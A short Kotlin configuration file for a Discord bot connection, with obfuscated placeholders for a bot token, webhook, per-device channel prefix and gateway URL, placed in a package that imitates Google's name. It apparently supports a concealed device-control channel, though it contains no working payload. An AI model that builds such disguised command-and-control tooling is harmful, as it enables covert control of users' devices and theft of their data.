package com.google.system

object DiscordConfig {
    
    private const val ENCRYPTED_BOT_TOKEN = "encrypted_token_here"
    private const val ENCRYPTED_WEBHOOK_URL = "encrypted_webhook_here"
    private const val ENCRYPTED_CHANNEL_PREFIX = "encrypted_prefix_here"
    private const val ENCRYPTED_GATEWAY_URL = "encrypted_gateway_here"
    
    val BOT_TOKEN: String
        get() = StringObfuscator.deobfuscate(ENCRYPTED_BOT_TOKEN)
    
    val WEBHOOK_URL: String
        get() = StringObfuscator.deobfuscate(ENCRYPTED_WEBHOOK_URL)
    
    val CHANNEL_PREFIX: String
        get() = StringObfuscator.deobfuscate(ENCRYPTED_CHANNEL_PREFIX)
    
    val GATEWAY_URL: String
        get() = StringObfuscator.deobfuscate(ENCRYPTED_GATEWAY_URL)
    
    const val INTENTS = 3276791
    
    const val RECONNECT_BASE_DELAY = 1000L
    const val MAX_RECONNECT_DELAY = 60000L
    
    fun initialize(token: String, webhook: String, prefix: String = "device-", gateway: String = "wss://gateway.discord.gg/?v=10&encoding=json") {
        // This would be called at runtime to set the encrypted values
        // In production, these would be set during build time
    }
}
